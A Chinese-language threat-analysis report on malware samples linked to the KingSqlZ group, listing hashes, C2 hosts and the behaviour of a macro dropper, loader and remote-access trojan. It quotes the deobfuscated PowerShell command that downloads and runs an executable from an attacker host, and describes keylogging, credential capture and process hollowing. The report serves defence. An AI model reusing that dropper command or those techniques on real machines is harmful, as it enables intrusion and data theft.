> 原文链接: https://www.anquanke.com//post/id/179714 


# 针对KingSqlZ组织一次攻击的分析报告


                                阅读量   
                                **208300**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">12</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p5.ssl.qhimg.com/t013341b19c36b14b9a.jpg)](https://p5.ssl.qhimg.com/t013341b19c36b14b9a.jpg)

## 0x1 IoC

### <a name="0x2.1_Hash"></a>**0x1.1 Hash**

本次一共截获了两个和KingSqlZ组织有关的可疑样本，其中有一个是一个doc样本，通过使用宏进行文件传播，IOC如下：
- 样本名称：4fb43047463380ae25cb7684433f6a7e4f4b8b1669048291aca20182877a2810.doc
- 样本Hash：4fb43047463380ae25cb7684433f6a7e4f4b8b1669048291aca20182877a2810
- 样本类型：ole文件(带宏)
另外一个是一个PE文件。IOC如下：
- 样本名称：298ee13829733e23557b5f0db3d93768c0665260be17dc9010288d33ca6fe77f.exe
- 样本Hash：298ee13829733e23557b5f0db3d93768c0665260be17dc9010288d33ca6fe77f
- 是否加壳：无壳
- 编译语言：maybe C++ Visual Studio 201x or Asm demo/example [DebuG]
以及这两个样本释放的其他样本的IOC(不包括内存转储):
- 2d69c9a9622b9b812db1833caec237995eedd0dee59ece53bd359e7083023f47
- 9211473ae545a0248b4ef4bb1bea1acffc1ec85ecb42194984266416720a7f73
- c242bfb6aa6d47087d77d25955bd48a5421fb0353049828ec99d44e119874b7a
- 7a01dd19b5a74e7023d19a19065f49fb013c9f0f7fee974d717d46a8369b8e60
### <a name="0x2.2_C2"></a>**0x1.2 C2**
- [http://www.gestomarket.co/ylqrg54.exe](http://www.gestomarket.co/ylqrg54.exe)
- asdfwrkhl.warzonedns.com
- linksysdatakeys.se
- 67.228.235.93
- 187.136.91.177
- 187.155.84.184
- 31.13.73.17
- 67.228.235.93
- 31.13.73.23
- 74.86.228.110
- 187.155.84.184
- 69.171.239.11
- 187.155.47.67
- 66.220.147.47
- 31.13.86.1
- 31.13.75.17:2404
- 备注：这些主机本身不具备相关性，因为他们都是由于被该组织渗透成为该组织攻击的跳板


## 0x2 行为分析

名称统一使用Hash的前几个字符加后缀的方式命名。主要操作是远控类木马。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01ad320e712c3d2486.png)

[![](https://p2.ssl.qhimg.com/t010d91008f63956466.png)](https://p2.ssl.qhimg.com/t010d91008f63956466.png)

## 0x3 样本分析

### <a name="0x4.1_4fb430.doc"></a>**0x3.1 4fb430.doc**

是一个doc宏病毒样本，通过使用oledump获取其中的宏代码。

[![](https://p5.ssl.qhimg.com/t01645af056c98395d9.png)](https://p5.ssl.qhimg.com/t01645af056c98395d9.png)

发现宏代码被混淆严重，去混淆结合沙箱的结果推测具体行为如下：
- 宏代码调用cmd，解密其中的十进制数据。
- 接着调用powershell。下载massive.exe- powershell.exe -w hidden -ep bypass (New-Object System.Net.WebClient).DownloadFile(‘http://www.gestomarket.co/ylqrg54.exe’,$env:temp + ‘massive.exe’);- 运行massive.exe
### <a name="0x4.2_massive.exe"></a>**0x3.2 massive.exe**

首先这个样本是一个C#程序，使用ILSpy查看源代码。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01d22ce3cfa21a2f1d.png)

将程序定位到关键的地方。发现这个样本也只是一个外壳程序，用于从攻击跳板上获取攻击代码，然后将其写入我们的内存中，从内存中执行攻击代码，实现了无文件落地，有效规避了查杀。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0192a0c41fa1acaf2f.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01fc9999356414eb13.png)

使用进程替换技术，先创建一个和自身相同的子进程，然后使用进程替换进程，执行我们的攻击代码。但是由于C#不好被调试，所以将其子进程转储得到我们落地的攻击样本如下，命名为DumpFrommassive.exe

[![](https://p5.ssl.qhimg.com/t01e96cbe7c3a6878f7.png)](https://p5.ssl.qhimg.com/t01e96cbe7c3a6878f7.png)

[![](https://p3.ssl.qhimg.com/t01ed36d9869504ecb6.png)](https://p3.ssl.qhimg.com/t01ed36d9869504ecb6.png)

### <a name="0x4.3_DumpFrommassive.exe"></a>**0x3.3 DumpFrommassive.exe**

创建一个互斥体，然后获取多个API函数地址

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01514d977ca48449ce.png)

接着判断是否是X64系统，然后通过注册表SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName获取系统的版本信息。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01b9a090a32deb0a1f.png)

当判断是xp系统，就去获取HKEY_CURRENT_USERorigmsc数据，但是分析机器上未发现这样的键。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t018f6d35096aa5e585.png)

利用注册表HKLMSOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem 关闭UAC通知

[![](https://p2.ssl.qhimg.com/t013de433329892f29b.png)](https://p2.ssl.qhimg.com/t013de433329892f29b.png)

通过当前的环境变量获取特殊目录的路径

[![](https://p1.ssl.qhimg.com/t011d3ea83cb8325909.png)](https://p1.ssl.qhimg.com/t011d3ea83cb8325909.png)

获取目标进程的相关信息包括模块和32/64位进程，这个进程是由于注册表中的数据决定。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01230b61e9ef1bde3a.png)

由于转储很多静态数据丢失，过于细节的数据没有办法复现。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t011b1294a8dc4816e1.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01b009e70543c31fd1.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0127c690198e4befca.png)

由于该组织使用渗透的方式，得到多台服务器的控制权，让这些服务器充当此次攻击的跳板机和C2

[![](https://p4.ssl.qhimg.com/t01a6a0bac105bdd224.png)](https://p4.ssl.qhimg.com/t01a6a0bac105bdd224.png)

通过设置键盘钩子的形式，记录键盘输入，和剪切板数据

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01737e77a4521efcb5.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01ddae456136f24bf6.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t019cf72ae5a3e56f42.png)

[![](https://p3.ssl.qhimg.com/t01c53b76fe4cbb28bf.png)](https://p3.ssl.qhimg.com/t01c53b76fe4cbb28bf.png)

创建新线程，执行截图

[![](https://p3.ssl.qhimg.com/t01edb5ed7fefb7b400.png)](https://p3.ssl.qhimg.com/t01edb5ed7fefb7b400.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t012f7201e4d6df96cb.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01c972bff42456d53d.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01fd1e310be156890b.png)

创建新线程进行音视频传输

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01f948ebcf9c660bd5.png)

清空主流浏览器的COOKIE和保存的表单(账户和密码)，这样就可以在用户重新输入密码的时候记录下来。

[![](https://p4.ssl.qhimg.com/t01cae85cc452bb3bbd.png)](https://p4.ssl.qhimg.com/t01cae85cc452bb3bbd.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t011667ee05bb385211.png)

获取用户名，机器名称，主要是识别作用

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01d650ea178900eb72.png)

关闭数据执行保护DEP

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t015e29ff2279cac438.png)

执行后门远控操作，主要的行为有键盘记录，截图，视频，发送数据，联网下载数据，检索服务，创建开启服务，程序执行，傀儡进程，提权关机。
<li>提权关机<br>[![](https://p2.ssl.qhimg.com/t01a77d30acc04fdcee.png)](https://p2.ssl.qhimg.com/t01a77d30acc04fdcee.png)<br>[![](https://p0.ssl.qhimg.com/t01cf89b019399d72f9.png)](https://p0.ssl.qhimg.com/t01cf89b019399d72f9.png)
</li>
<li>键盘记录<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01b64bacaebf7a8715.png)
</li>
<li>发送键盘输入数据<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t018da9dc6162e567a1.png)
</li>
<li>安装软件信息，并发送<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t016fcd0be34636232f.png)
</li>
<li>从Internet上读取可执行的shellcode，并执行<br>[![](https://p0.ssl.qhimg.com/t01917e43fc86099c94.png)](https://p0.ssl.qhimg.com/t01917e43fc86099c94.png)
</li>
<li>获取进程列表<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01e3c0d173c3c9aa26.png)
</li>
<li>利用管道实现和C2之间的数据交互<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01024f038018a89ca1.png)
</li>
<li>截图<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01370c9eff1afd018f.png)
</li>
<li>键盘区域<br>[![](https://p3.ssl.qhimg.com/t01c213515d93e4f265.png)](https://p3.ssl.qhimg.com/t01c213515d93e4f265.png)
</li>
<li>删除，清空文件<br>[![](https://p3.ssl.qhimg.com/t01a50598d6bbf773f5.png)](https://p3.ssl.qhimg.com/t01a50598d6bbf773f5.png)
</li>
<li>清空COOKIE和用户名密码<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01bbf821102bd015c4.png)
</li>
<li>音视频<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0169a48c13fc871d60.png)<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0183b3ffe6405449bc.png)
</li>
<li>从Internet上下载数据并执行<br>[![](https://p4.ssl.qhimg.com/t0148a9093760317c9f.png)](https://p4.ssl.qhimg.com/t0148a9093760317c9f.png)
</li>
<li>获取服务相关信息<br>[![](https://p3.ssl.qhimg.com/t016c4f29a08bb61c0e.png)](https://p3.ssl.qhimg.com/t016c4f29a08bb61c0e.png)
</li>
综上，对此样本定性为**后门远控类文件**。

### <a name="0x4.4_298eeexe.exe"></a>**0x4.4 298eeexe.exe**
<li>从[http://www.gestomarket.co/hqpi64.exe下载文件，并执行](http://www.gestomarket.co/hqpi64.exe%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B9%B6%E6%89%A7%E8%A1%8C)<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t011c56b88762d73b4f.png)
</li>
### <a name="0x4.5_2XC2DF0S.exe"></a>**0x4.5 2XC2DF0S.exe**
<li>SHA256为2d69c9a9622b9b812db1833caec237995eedd0dee59ece53bd359e7083023f47，查壳是UPX的壳，ESP拖一下.<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01e5860191567d336f.png)
</li>
<li>主要使用了SMC技术<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t0132a9f9e0a3d90f75.png)
</li>
<li>根据动态分析，可以得到样本创建了fyhgzmilgyvvgdu.exe和「开始」菜单程序启动创建fyhgzmilgyvvgdu.eu.url。创建url的目的是实现了fyhgzmilgyvvgdu.exe的自启动<br>[![](https://p0.ssl.qhimg.com/t01966abb4b1d0244f1.png)](https://p0.ssl.qhimg.com/t01966abb4b1d0244f1.png)<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01b21ec4d53a71ddde.png)<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t011c0a6d0826efd698.png)
</li>
<li>创建自身子进程，并进行进程替换<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t014e33ca14808e715d.png)<br>[![](https://p4.ssl.qhimg.com/t01d39a732ff4dce1fd.png)](https://p4.ssl.qhimg.com/t01d39a732ff4dce1fd.png)<br>[![](https://p0.ssl.qhimg.com/t01083fc14c7cc1e884.png)](https://p0.ssl.qhimg.com/t01083fc14c7cc1e884.png)
</li>
<li>dump出傀儡进程的PE数据，命名为DumpFrom2d69exe.exe_<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t011c24bc113de5cf12.png)
</li>
### <a name="0x4.6_DumpFrom2d69exe.exe_"></a>**0x3.6 DumpFrom2d69exe.exe_**
<li>首先样本会先链接到C2服务器asdfwrkhl.warzonedns.com，当确认链接上asdfwrkhl.warzonedns.com,此时会从C2上接收数据<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01c261727c2f8f8a90.png)<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01de14151ccbb341b9.png)
</li>
<li>然后将自身路径写入SOFTWARE_rptls注册表中，但是注意的是这个是从2XC2DF0S.exe转储出来的，所以原始的模块名应该是2XC2DF0S.exe。加载资源文件，然后有个函数是解密shellcode，然后在把加载入内存的资源文件作为参数传入，初步怀疑应该从内存中执行。这样有效避免了查杀。将资源文件命名为Resource.bin<br>[![](https://p2.ssl.qhimg.com/t01f3552bdef8d22ce4.png)](https://p2.ssl.qhimg.com/t01f3552bdef8d22ce4.png)<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0135c8eb2e1870a02e.png)<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t018e386bf9d1056d67.png)<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t019e4de36dbe6dee60.png)
</li>
<li>直接就是一个后门程序的主体框架。主要包括三大类的功能，第一交流通信，第二，下载执行，第三，信息记录，第四，测试退出，第五驻留操作。<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01e9365bb3e50894e5.png)
</li>
<li>第一：通信交流<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0127e714a4382bf0d8.png)<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t019eab242c3ee53351.png)<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01b43175d7c1017513.png)
</li>
<li>第二：下载执行，但是由于分析的时候，没有处于攻击窗口期，所以没有办法了解到此次下载的是何种程序，然后加载了一些网络库，运行时库<br>[![](https://p4.ssl.qhimg.com/t01529c16f1f9a0300b.png)](https://p4.ssl.qhimg.com/t01529c16f1f9a0300b.png)<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t017775f073ef7bacd7.png)<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t016f928551358670e4.png)
</li>
<li>第三：信息记录，主要是键盘记录，和常见的手段一样，使用了钩子技术，截获用户的键盘输入，并记录按键信息，把并发送个C2服务器<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01427c1d316483bf8c.png)<br>[![](https://p5.ssl.qhimg.com/t018682b6a4166b38d4.png)](https://p5.ssl.qhimg.com/t018682b6a4166b38d4.png)<br>[![](https://p0.ssl.qhimg.com/t01762fdd5c3729162c.png)](https://p0.ssl.qhimg.com/t01762fdd5c3729162c.png)<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBV